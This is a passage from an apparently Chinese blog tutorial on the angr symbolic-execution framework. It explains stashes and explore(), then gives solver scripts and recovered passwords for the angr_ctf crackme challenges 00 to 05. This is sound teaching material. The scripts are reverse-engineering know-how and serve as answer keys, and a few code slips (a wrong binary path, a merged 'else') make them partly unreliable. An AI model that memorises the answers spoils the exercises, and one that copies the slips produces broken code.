p.factory.simgr(state)</span><br></pre></td></tr></table></figure><p>SM中有许多列表，这些列表被称为stash，它保存了处于某种状态的state，stash有如下几种：</p><table><thead><tr><th>stash</th><th>描述</th></tr></thead><tbody><tr><td>active</td><td>保存接下来可以执行并且将要执行的状态</td></tr><tr><td>deadended</td><td>由于某些原因不能继续执行的状态，例如没有合法指令，或者有非法指针</td></tr><tr><td>pruned</td><td>与solve的策略有关，当发现一个不可解的节点后，其后面所有的节点都优化掉放在pruned里</td></tr><tr><td>unconstrained</td><td>如果创建SM时启用了save_unconstrained，则被认定为不受约束的state会放在这，不受约束的state是指由用户数据或符号控制的指令指针（例如eip）</td></tr><tr><td>unsat</td><td>如果创建SM时启用了save_unsat，则被认为不可满足的state会放在这里</td></tr></tbody></table><p>默认情况下，state会被存放在active中。</p><p>stash中的state可以通过move()方法来转移，将fulter_func筛选出来的state从from_stash转移到to_stash：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simgr.move(from_stash=&#x27;deadended&#x27;, to_stash=&#x27;more_then_50&#x27;, filter_func=lambda s: &#x27;100&#x27; in s.posix.dumps(1))</span><br></pre></td></tr></table></figure><p>stash是一个列表，可以使用python支持的方式去遍历其中的元素，也可以使用常见的列表操作。但angr提供了一种更高级的方式，在stash名字前加上one_，可以得到stash中的第一个状态，加上mp_，可以得到一个mulpyplexed版本的stash</p><p>此外，稍微解释一下上面代码中的posix.dumps：</p><ul><li>state.posix.dumps(0):表示到达当前状态所对应的程序输入</li><li>state.posix.dumps(1):表示到达当前状态所对应的程序输出</li></ul><p>上述代码就是将deadended中输出的字符串包含’100’的state转移到more_then_50这个stash中。</p><p>可以通过step()方法来让处于active的state执行一个基本块，这种操作不会改变state本身：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; state = p.factory.entry_state()</span><br><span class="line">&gt;&gt;&gt; simgr = p.factory.simgr(state)</span><br><span class="line">&gt;&gt;&gt; print(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 0x1c&gt; &lt;BV64 0x4023c0&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(simgr.one_active)</span><br><span class="line">&lt;SimState @ 0x4023c0&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; simgr.step()</span><br><span class="line">&lt;SimulationManager with 1 active&gt;</span><br><span class="line">&gt;&gt;&gt; print(simgr.one_active)</span><br><span class="line">&lt;SimState @ 0x529240&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print(state.regs.rax, state.regs.rip)</span><br><span class="line">&lt;BV64 0x1c&gt; &lt;BV64 0x4023c0&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&#x27;./00_angr_find&#x27;</span>)     <span class="comment"># 1. 加载一个二进制文件，创建 Project</span></span><br><span class="line">state = p.factory.entry_state()       <span class="comment"># 2. 从程序入口（默认是 _start 或 main 前）构造一个初始状态</span></span><br><span class="line">simgr = p.factory.simgr(state)        <span class="comment"># 3. 基于这个初始状态，生成一个 SimulationManager 来管理执行路径</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(state.regs.ax)                  <span class="comment"># 4. 打印当前状态下寄存器 ax 的值</span></span><br><span class="line"><span class="built_in">print</span>(simgr.one_active)               <span class="comment"># 5. 打印当前活跃状态（active stash 里只有一个 state）</span></span><br><span class="line">simgr.step()                          <span class="comment"># 6. 让模拟器执行一步（相当于执行一条或几条指令）</span></span><br><span class="line"><span class="built_in">print</span>(simgr.one_active)               <span class="comment"># 7. 再次打印现在活跃状态（执行完之后的位置）</span></span><br><span class="line"><span class="built_in">print</span>(state.regs.ax)                  <span class="comment"># 8. 再次打印最开始 state 对象里的 ax</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong><code>simgr.one_active</code></strong> SimulationManager 会把状态放到不同的“stash”（active、deadended、errored 等）。</p><p><code>one_active</code> 就是 <strong>当前活跃状态</strong>，如果只有一个，就直接取出来。</p><p><strong><code>simgr.step()</code></strong> 让所有 active 状态都执行一步指令。</p><p> 这一步之后，<code>simgr.one_active</code> 里的状态的 <code>ip</code>（指令指针&#x2F;程序计数器）会移动到下一条指令。</p></blockquote><p>最后也是SM最常用的技术：探索技术（explorer techniques）</p><p>可以使用explorer方法去执行某个状态，直到找到目标指令或者active中没有状态为止，它有如下参数：</p><ul><li>find：传入目标指令的地址或地址列表，或者一个用于判断的函数，函数以state为形参，返回布尔值</li><li>avoid：传入要避免的指令的地址或地址列表，或者一个用于判断的函数，用于减少路径</li></ul><p>此外还有一些搜索策略，之后会集中讲解，默认使用DFS（深度优先搜索）。</p><p>explorer找到的符合find的状态会被保存在simgr.found这个列表当中，可以遍历其中元素获取状态。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line"><span class="built_in">print</span>(simgr)</span><br><span class="line"><span class="built_in">print</span>(simgr.active)</span><br><span class="line"><span class="built_in">print</span>(simgr.active[<span class="number">0</span>].regs.eip)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;---&#x27;</span>)</span><br><span class="line">simgr.step()</span><br><span class="line"><span class="built_in">print</span>(simgr.active)</span><br><span class="line"><span class="built_in">print</span>(simgr.active[<span class="number">0</span>].regs.eip)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; 这里执行了一整个基本块（注意：smigr不会改变state的信息）</span></span><br><span class="line"><span class="string">&lt;SimulationManager with 1 active&gt;</span></span><br><span class="line"><span class="string">[&lt;SimState @ 0x80490b0&gt;]</span></span><br><span class="line"><span class="string">&lt;BV32 0x80490b0&gt;</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[&lt;SimState @ 0x80490dd&gt;]</span></span><br><span class="line"><span class="string">&lt;BV32 0x80490dd&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><p>angr作为一个二进制分析的工具包，但它通常作为符号执行工具更为出名。</p><p>符号执行就是给程序传递一个符号而不是具体的值，让这个符号伴随程序运行，当碰见分支时，符号会进入哪个分支呢？</p><p>angr的回答是全都进入！angr会保存所有分支，以及分支后的所有分支，并且在分支时，保存进入该分支时的判断条件，通常这些判断条件时对符号的约束。</p><p>当angr运行到目标状态时，就可以调用求解器对一路上收集到的约束进行求解，最终得到某个符号能够到达当前状态的值。</p><p>例如，程序接收一个int类型的输入，当这个输入大于0小于5时，就会执行某条保存在该程序中，我们希望执行的指令（例如一个后门函数backdoor），具体而言如下图所示：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927155241557.png" alt="image-20250927155241557"></p><p>angr会沿着分支按照某种策略（默认DFS）进行状态搜索，当达到目标状态（也就是backdoor能够执行的状态），此时angr已经收集了两个约束（x&gt;0 以及x&lt;&#x3D;5），那么angr就通过这两个约束对x进行求解，解出来的x值就是能够让程序执行backdoor的输入。</p><p>在复杂的程序当中，从一个符号到backdoor的路径可能十分复杂，甚至包含一些加密解密的过程，这时就是angr大显身手的时候了。</p><p>angr在模拟执行指令时，对于遇到的分支和跳转，会全部进行保留，并且记录用于判断分支的条件（即约束），如下图所示</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927175358404.png" alt="image-20250927175358404"></p><p>这些状态都是程序运行到某些阶段时的信息，包括了内存、寄存器、文件系统等多个方面，这些状态中有满足条件的状态，就会被放入到found列表当中。</p><p>而在路径搜索时，对于满足avoid条件的状态，则会被丢弃，也就是说，该状态及该状态的后续路径都不会被进行搜索，因此简化了angr的搜索路径，从而提高效率。</p><h1 id="Angr-CTF"><a href="#Angr-CTF" class="headerlink" title="Angr CTF"></a>Angr CTF</h1><p>使用angr一般分为如下步骤：</p><ol><li>创建Project，预设state</li><li>创建位向量和符号变量，保存在内存&#x2F;寄存器&#x2F;文件或其他地方</li><li>将state添加到SM中</li><li>运行，探索满足条件的路径</li><li>约束求解获取执行结果</li></ol><h2 id="SimulationManager-explore"><a href="#SimulationManager-explore" class="headerlink" title="SimulationManager.explore()"></a>SimulationManager.explore()</h2><p>这三道题目学习给explore选择参数。</p><h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><p>程序逻辑</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927160017349.png" alt="image-20250927160017349"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927160640620.png" alt="image-20250927160640620"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载文件，预设状态，执行状态</span></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./dist/00_angr_find&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">simgr = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts Good的指令地址</span></span><br><span class="line">target = <span class="number">0x08048678</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索能够执行目标指令的状态</span></span><br><span class="line">simgr.explore(find=target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    solution_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 打印出符号条件的状态的输入</span></span><br><span class="line">    <span class="built_in">print</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;JXWVXRKX</span><br></pre></td></tr></table></figure><p>事实上，上述脚本能够解决一切有关”为了执行某条目标语句，我应该用怎样的输入”这样的问题，是一个万能脚本。区别在于由于程序的复杂程度和逻辑不同，耗费的时间不同，因此在解决这类问题上，编写angr脚本的本质是在使用angr提供的各种二进制分析方法去优化路径，提高它的运行效率。</p><h3 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载文件，预设状态，执行状态</span></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./dist/00_angr_find&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">simgr = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts Good的指令地址</span></span><br><span class="line">target = <span class="number">0x080485E5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索能够执行目标指令的状态</span></span><br><span class="line">simgr.explore(find=target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    solution_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 打印出符号条件的状态的输入</span></span><br><span class="line">    <span class="built_in">print</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样不行，因为直接崩了，中间函数太复杂太多了</p><p>可以发现该函数被main函数调用了多次，应该是导致main函数过大的原因，因此要对它进行避免，也就是使用explorer的avoid的参数。</p><p>这里需要让angr走到<code>avoid_me</code>函数后就剪枝</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927161628031.png" alt="image-20250927161628031"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./dist/01_angr_avoid&#x27;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">simgr = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">good = <span class="number">0x080485e5</span><span class="comment">#avoid_me的函数起始的位置（并非调用该函数的位置，因为调用该函数的地方太多了）</span></span><br><span class="line">bad = <span class="number">0x080485a8</span></span><br><span class="line">simgr.explore(find= good,avoid = bad)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    solution = simgr.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(solution.posix.dumps(<span class="number">0</span>))<span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not find solution&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HUJOZMYS</span><br></pre></td></tr></table></figure><blockquote><p>simgr.found[0]</p><ul><li><strong>遇到地址 <code>good</code></strong> → 停下来放到 <code>found</code> 集合里</li><li><strong>遇到地址 <code>bad</code></strong> → 扔掉放到 <code>avoid</code> 集合里</li></ul><p><code>simgr.found</code> 就是所有到达了 “good” 的路径的列表（state 列表）。</p><p><code>simgr.found[0]</code> 取出第一个满足条件的 <strong>state</strong>，即程序在“成功位置”的状态。</p><p><code>solution.posix.dumps(0)</code></p><p>在 angr 里，state 有个 <code>posix</code> 接口，模拟 Linux&#x2F;Unix 程序运行时的 I&#x2F;O。</p><p><code>posix.dumps(fd)</code> 的作用是：</p><p>把指定文件描述符（fd）的内容“dump”出来，返回字节串。</p><p>常见文件描述符号：</p><p><code>0</code> → 标准输入 <strong>stdin</strong></p><p><code>1</code> → 标准输出 <strong>stdout</strong></p><p><code>2</code> → 标准错误 <strong>stderr</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./angr&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">simgr = proj.factory.simgr()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_avoid</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="comment"># 检查输出是否包含&quot;Try again&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 检查当前地址是否是我们想要避免的地址</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == <span class="number">0x8049243</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 如果以上条件都不满足，那么我们不避免这个状态</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">simgr.explore(find = <span class="keyword">lambda</span> s1: <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> s1.posix.dumps(<span class="number">1</span>), avoid = should_avoid)</span><br><span class="line"></span><br><span class="line">s = simgr.found[<span class="number">0</span>]</span><br><span class="line">flag = s.posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也能解，但是should_avoid会有额外开销</p><h3 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./dist/02_angr_find_condition&#x27;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">simgr = p.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">good</span>(<span class="params">state</span>):</span><br><span class="line">    tag = <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> tag <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bad</span>(<span class="params">state</span>):</span><br><span class="line">    tag = <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> tag <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">simgr.explore(find=good, avoid=bad)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    solution = simgr.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(solution.posix.dumps(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Could not find solution&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Symbolic"><a href="#Symbolic" class="headerlink" title="Symbolic"></a>Symbolic</h2><p>学习怎么在寄存器，栈，堆，文件等处注入符号变量。</p><h3 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h3><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927220900954.png" alt="image-20250927220900954"></p><p>里面有三个复杂功能</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927221008908.png" alt="image-20250927221008908"></p><p>用IDA打开程序，get_user_input把三个输入分别放入寄存器eax、ebx、edx。我们需要跳过输入这一步，直接让Angr把用符号向量来代替输入字符串。因此，我们需要改变程序入口，直接跳转到参数入栈的位置，然后新建三个符号向量，并把三个符号向量分别放到寄存器eax、ebx、edx。</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927221901590.png" alt="image-20250927221901590"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&#x27;./dist/03_angr_symbolic_registers&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新设定入口点，此处从sanf输入开始执行。此处不用entry_state，而是blank_state</span></span><br><span class="line">start_address = <span class="number">0x08048980</span></span><br><span class="line">initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建三个个符号向量，第一个参数是用来引用的，第二个参数是CPU位数，如32</span></span><br><span class="line">password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据IDA，分别设置eax、ebx、edx的符号值</span></span><br><span class="line">initial_state.regs.eax = password0</span><br><span class="line">initial_state.regs.ebx = password1</span><br><span class="line">initial_state.regs.edx = password2</span><br><span class="line"></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">should_abort</span>(<span class="params">state</span>):</span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 求解</span></span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1)</span><br><span class="line">    solution2 = solution_state.solver.<span class="built_in">eval</span>(password2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印输出十六进制</span></span><br><span class="line">    solution = <span class="string">&quot;Solutions:&#123;:x&#125; &#123;:x&#125; &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(solution0, solution1, solution2)</span><br><span class="line">    <span class="built_in">print</span>(solution)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def should_abort(state):</span><br><span class="line">    stdout_output = state.posix.dumps(1)</span><br><span class="line">    return b&#x27;Try again.&#x27; in stdout_output</span><br></pre></td></tr></table></figure><p>这样也行</p><h3 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h3><p><strong>当符号值位于栈上时，需要提前做好栈布局，再将符号值放到栈上（push或直接内存赋值）。</strong></p><p><code>state.stack_push(thing)</code></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927233118025.png" alt="image-20250927233118025"></p><p>输入后栈为这样的，一开始esp和ebp是同一位置</p><p>esp只需要抬高0x8即可输入，上面那张图截图的时机有点问题，esp在0x17下面时更好理解(也就是未输入时)</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250927233305665.png" alt="image-20250927233305665"></p><h3 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./dist/05_angr_symbolic_memory&#x27;</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x08048601</span></span><br><span class="line">init_state = p.factory.blank_state(addr = start_addr)</span><br><span class="line"></span><br><span class="line">p1 = init_state.solver.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">p2 = init_state.solver.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">p3 = init_state.solver.BVS(<span class="string">&#x27;p3&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">p4 = init_state.solver.BVS(<span class="string">&#x27;p4&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">p1_addr = <span class="number">0x0a1ba1c0</span></span><br><span class="line">p2_addr = <span class="number">0x0a1ba1c8</span></span><br><span class="line">p3_addr = <span class="number">0x0a1ba1d0</span></span><br><span class="line">p4_addr = <span class="number">0x0a1ba1d8</span></span><br><span class="line"></span><br><span class="line">init_state.memory.store(p1_addr, p1)</span><br><span class="line">init_state.memory.store(p2_addr, p2)</span><br><span class="line">init_state.memory.store(p3_addr, p3)</span><br><span class="line">init_state.memory.store(p4_addr, p4)</span><br><span class="line"></span><br><span class="line">sm = p.factory.simgr(init_state)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> 